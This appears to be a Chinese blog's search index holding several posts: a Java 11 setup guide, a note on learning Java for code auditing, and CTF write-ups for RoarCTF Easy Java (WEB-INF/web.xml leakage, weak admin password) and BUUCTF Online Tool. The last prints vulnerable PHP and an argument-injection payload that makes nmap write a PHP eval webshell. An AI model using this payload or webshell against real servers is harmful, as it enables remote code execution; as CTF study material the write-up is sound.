<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>java开发环境准备</title>
      <link href="2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"/>
      <url>2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<p>我想尝试一下java11 的TLS 版本，而我以前装的版本是java8，所以在这个博客中我想记录一下java的删除与安装，和java开发神器IDEA的使用</p><span id="more"></span><h3 id="JDK-JRE-JVM"><a href="#JDK-JRE-JVM" class="headerlink" title="JDK JRE JVM"></a>JDK JRE JVM</h3><blockquote><p>JDK ： Java Development</p><p>JRE ： Java Runtime Environment</p><p>JVM ：Java Virtual Machine</p></blockquote><p>三者关系如下图</p><p><img src="https://img-blog.csdnimg.cn/20181102183439614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5NDc5MDQx,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20181102183439614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5NDc5MDQx,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="java8的卸载"><a href="#java8的卸载" class="headerlink" title="java8的卸载"></a>java8的卸载</h3><p>java的卸载是一件相对繁琐的事情</p><ul><li><p>删除注册表：</p><p>WIN +R regedit</p><p>找到 HKEY_LOCAL_MACHINE/SOFTWARE/JavaSoft</p><p>将JavaSoft文件夹及其子文件目录删除</p></li><li><p>删除环境变量</p><p>计算机-&gt;属性-&gt;高级系统设置-&gt;高级-&gt;环境变量</p><ul><li>删除 JAVA_HOME变量</li><li>删除 CLASSPATH 变量</li><li>删除 Path变量 里的 <code>%JAVA_HOME\bin; %JAVA_HOME%\jre\bin</code></li></ul></li><li><p>删除windows文件夹下的赋值文件</p><p>将C盘中的Windows\System32 和 Windows\SysWOW64文件夹下的java.exe javaw.exe 和javaws.exe 删除</p></li><li><p>删除程序JAVA</p><p>控制面板 卸载程序 </p></li><li><p>cmd 测试 </p></li></ul><h3 id="java11的安装"><a href="#java11的安装" class="headerlink" title="java11的安装"></a>java11的安装</h3><p><a href="https://www.oracle.com/java/technologies/javase-jdk11-downloads.html">jdk11下载地址</a></p><p><img src="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326205830748.png" class="lazyload" data-srcset="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326205830748.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210326205830748"></p><p>更改路径即可</p><p><img src="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326205921969.png" class="lazyload" data-srcset="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326205921969.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210326205921969"></p><h4 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h4><p>跟java1.8有些不一样，java11不在需要添加jre的路径，也不存在jre文件</p><h5 id="创建JAVA-HOME"><a href="#创建JAVA-HOME" class="headerlink" title="创建JAVA_HOME"></a>创建JAVA_HOME</h5><p><code>D:\Java\jdk11</code></p><h5 id="添加PATH"><a href="#添加PATH" class="headerlink" title="添加PATH"></a>添加PATH</h5><p><code>%JAVA_HOME%\bin</code></p><p>至于很多教程上的 CLASSPATH 配置，这是个历史遗留的问题，早在jdk1.6时代配置还需要，但是现在早已经不需要了（jdk1.8都不需要）</p><p><img src="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326215844326.png" class="lazyload" data-srcset="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326215844326.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210326215844326"></p><h3 id="hello-world-测试"><a href="#hello-world-测试" class="headerlink" title="hello world!测试"></a>hello world!测试</h3><p>新建一个java文件</p><p><img src="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326222924593.png" class="lazyload" data-srcset="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326222924593.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210326222924593"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">System.out.print(<span class="string">&quot;hello,world!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326220939552.png" class="lazyload" data-srcset="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326220939552.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210326220939552"></p><h3 id="编译型与解释型语言"><a href="#编译型与解释型语言" class="headerlink" title="编译型与解释型语言"></a>编译型与解释型语言</h3><p>java既是编译型语言也是解释型语言</p><p><img src="https://image.fundebug.com/2019-01-24-01.png" class="lazyload" data-srcset="https://image.fundebug.com/2019-01-24-01.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Java到底是编译型语言还是解释型语言？ | Fundebug博客- 一行代码搞定BUG监控-  网站错误监控|JS错误监控|资源加载错误|网络请求错误|小程序错误监控|Java异常监控|监控报警|Source Map|用户行为|可视化重现"></p><p>编译型语言与解释型语言区别</p><p><img src="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326221441804.png" class="lazyload" data-srcset="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326221441804.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210326221441804"></p><p>简单讲就是编译型将源码一下子转换成可执行的机器语言，然后执行。而解释型语言一条一条转换成底层语言再执行</p><h3 id="IDEA的使用"><a href="#IDEA的使用" class="headerlink" title="IDEA的使用"></a>IDEA的使用</h3><p>非常舒适的界面</p><p><img src="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326230025739.png" class="lazyload" data-srcset="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326230025739.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210326230025739"></p>]]></content>
      
      
      <categories>
          
          <category> java学习之路 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>终究走上了java这条路</title>
      <link href="2021/03/26/%E7%BB%88%E7%A9%B6%E8%B5%B0%E4%B8%8A%E4%BA%86java%E8%BF%99%E6%9D%A1%E8%B7%AF/"/>
      <url>2021/03/26/%E7%BB%88%E7%A9%B6%E8%B5%B0%E4%B8%8A%E4%BA%86java%E8%BF%99%E6%9D%A1%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p>最终还是走向了java这条路，那就坚持下去，在此记录下自己的初心。碎碎念~</p><span id="more"></span><h3 id="为什么选择系统学习编程"><a href="#为什么选择系统学习编程" class="headerlink" title="为什么选择系统学习编程"></a>为什么选择系统学习编程</h3><p>作为一名想要从事网络安全行业的信息安全学生，我在大一就开始参加一下较为简单的ctf比赛，参与比赛多了基本能看懂php、java的后端代码，从而分析漏洞，利用漏洞。截止目前，我现在大二下学期，web漏洞原理烂熟于心，单个利用点的一些绕过方式也基本掌握，一些工具的使用也没问题。但是做一些代码审计工程，比如直接拖一个站的源码审计的时候，总是看不下去。想起了大一当时对着代码审计基础题一个函数一个函数查的时光，感觉自己好像变懒了，或者说这么长时间了，还不会代码有些失望，甚至随着审计量的上升对源码有种无力感。为了不甘于当一个脚本小子，一个只懂原理的用别人工具的伸手党，也是为能够审计庞大的代码量，我决定从基础开始补编程的基础。</p><h4 id="为什么选择java这门语言"><a href="#为什么选择java这门语言" class="headerlink" title="为什么选择java这门语言"></a>为什么选择java这门语言</h4><p>目前的自己，不管怎么说不可能说对编程一无所知。python本身审计过简单的flask站点，而且能够拿python写一些基础的爬虫或者一些exp脚本。但是真的很基础，以至于我当时对团队师傅分享的多线程awd脚本分析了好久。也通过python调用一些api接口，写过挂代理ip池的爬虫。但是感觉python这门语言什么都能做的背后，忽略了接口后面程序的原理。从长远来看，python更侧重一些非计算机专业的人或者从事科学研究的人使用，想要在web层看到程序背后的开发者的想法，自然更倾向于学习一门后端开发的语言。同时java作为安卓程序开发的一门语言对于从事移动安全研究也很有帮助，于是我选择了java。而且我觉得java能学好只有，学习一些其他的后端编程语言应该也很快，比如php、ruby。我学习java的目的，主要方向是代码审计，其次是能够通过java写一些好用的安全工具，点亮安全开发的技能树。</p><h4 id="怎么系统学习java"><a href="#怎么系统学习java" class="headerlink" title="怎么系统学习java"></a>怎么系统学习java</h4><p>我选择跟着b站的狂神师傅学java栈的开发技术，因为在我前面学习docker的时候就以狂神的课为基础，感觉这个老师精于技术的同时又是一名话语背后透露着思想光芒的理想主义者，而且他觉得好的教育不是灌输，而是点燃火焰。感觉很有共鸣。</p><p>我也相信，只要像sb一样坚持，终将牛逼。</p>]]></content>
      
      
      <categories>
          
          <category> java学习之路 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[RoarCTF 2019]Easy Java</title>
      <link href="2021/03/24/RoarCTF-2019-Easy-Java/"/>
      <url>2021/03/24/RoarCTF-2019-Easy-Java/</url>
      
        <content type="html"><![CDATA[<p>WEB-INF/web.xml 这个点由于对javaweb不熟悉清楚，记录下</p><span id="more"></span><h3 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h3><p>WEB-INF是什么</p><blockquote><p>WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.<a href="https://baike.baidu.com/item/xml%E6%96%87%E4%BB%B6/1994443">xml文件</a>对要访问的文件进行相应映射才能访问。</p></blockquote><p>WEB-INF简单理解为java web下的一种安全机制，WEB-INF 目录下的东西只能通过web.xml做相应映射才能让客户端访问</p><p>此目录下常有</p><blockquote><p>/WEB-INF/web.xml   Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则</p><p>/WEB-INF/classes/ 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中（是该目录不能包含在.jar文件中）。</p><p>/WEB-INF/lib/  存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件。</p><p>/WEB-INF/src/ 　源码目录，按照包名结构放置各个java文件。</p><p>/WEB-INF/database.properties  数据库配置文件</p><p>/WEB-INF/tags/ 存放了自定义标签文件，该目录并不一定为 tags，可以根据自己的喜好和习惯为自己的标签文件库命名</p><p>/WEB-INF/jsp/ jsp 1.2 以下版本的文件存放位置。</p><p>/WEB-INF/jsp2/   jsp 文件目录相比，该目录下主要存放 Jsp 2.0 以下版本的文件</p><p>META-INF 相当于一个信息包，目录中的文件和目录获得Java 2平台的认可与解释，用来配置应用程序、扩展程序、类加载器和服务</p><p>manifest.mf文件，在用jar打包时自动生成</p></blockquote><p>在ctf中 有一种常见的源码泄露方式为 WEB-INF/web.xml </p><p>漏洞检测以及利用方法：<strong>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</strong></p><p>这种漏洞的成因主要是映射配置不当</p><p>0x02 解题</p><p><img src="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155013651.png" class="lazyload" data-srcset="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155013651.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210324155013651"></p><p>一个登入框 尝试弱口令 admin/admin888成功</p><p><img src="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155050648.png" class="lazyload" data-srcset="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155050648.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210324155050648"></p><p>看来跟这里没关系</p><p><img src="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155120007.png" class="lazyload" data-srcset="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155120007.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210324155120007"></p><p><img src="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155129475.png" class="lazyload" data-srcset="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155129475.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210324155129475"></p><p>应该是个文件包含的点，但是get传参总是报错</p><p><img src="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155235740.png" class="lazyload" data-srcset="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155235740.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210324155235740"></p><p><img src="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155313286.png" class="lazyload" data-srcset="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155313286.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210324155313286"></p><p>对class下目录进行猜测得到</p><p><img src="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155710289.png" class="lazyload" data-srcset="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155710289.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210324155710289"></p><p><img src="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155817744.png" class="lazyload" data-srcset="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155817744.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210324155817744"></p><p>base64解码即为flag</p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源码泄露 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[BUUCTF 2018]Online Tool</title>
      <link href="2021/03/19/BUUCTF-2018-Online-Tool/"/>
      <url>2021/03/19/BUUCTF-2018-Online-Tool/</url>
      
        <content type="html"><![CDATA[<p>算是一道考点比较清晰的题，利用两个php中防止命令注入的函数搭配不当，而今造成过滤无效，产生命令执行</p><h3 id="0x01-源代码分析"><a href="#0x01-源代码分析" class="headerlink" title="0x01 源代码分析"></a>0x01 源代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考点显然就是</p><blockquote><p>escapeshellarg函数</p><p>escapeshellcmd函数</p></blockquote><p><img src="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210319231510695.png" class="lazyload" data-srcset="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210319231510695.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210319231510695"></p><p><img src="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210319231543251.png" class="lazyload" data-srcset="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210319231543251.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210319231543251"></p><h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>根据博文 <a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p><p>我分别在本地php7.3，php5.5.9，php5.2 环境下简单调试一下这两个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$param</span>=<span class="string">&quot;127.0.0.1&#x27; -v -d a=1&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=escapeshellarg(<span class="variable">$param</span>);</span><br><span class="line"><span class="variable">$b</span>=escapeshellcmd(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$cmd</span> =<span class="string">&quot;curl &quot;</span>.<span class="variable">$b</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$b</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$cmd</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">system(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>php7.3</p><p><img src="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210319235845982.png" class="lazyload" data-srcset="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210319235845982.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210319235845982"></p><p>php5.5</p><p><img src="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210319235807470.png" class="lazyload" data-srcset="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210319235807470.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210319235807470"></p><p>php5.2</p><p><img src="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210319235253373.png" class="lazyload" data-srcset="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210319235253373.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210319235253373"></p><p>由于低版本的php特殊的处理方式造成了此漏洞</p><h3 id="0x03-payload构造"><a href="#0x03-payload构造" class="headerlink" title="0x03 payload构造"></a>0x03 payload构造</h3><p><code>nmap -T5 -sT -Pn --host-timeout 2 -F</code> 这一命令实在 对部分常用端口特别快的进行tcp扫描，并且默认主机存活。</p><p>我们想办法构造一个webshell </p><blockquote><p><code>-oG test.txt</code>: 将扫描结果生成 test.txt 文件</p></blockquote><p>我们可以尝试将 webshell写入 文件，访问文件从而控制web服务</p><p>于是我们要构造型入 <code>&#39; &lt;?php @eval($_GET[&quot;M0th&quot;]);?&gt; -oG hacker.php &#39;</code>的字符串</p><p>测试发现并不需要什么过滤就可以执行</p><p><img src="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210320001405174.png" class="lazyload" data-srcset="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210320001405174.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210320001405174"></p><p><img 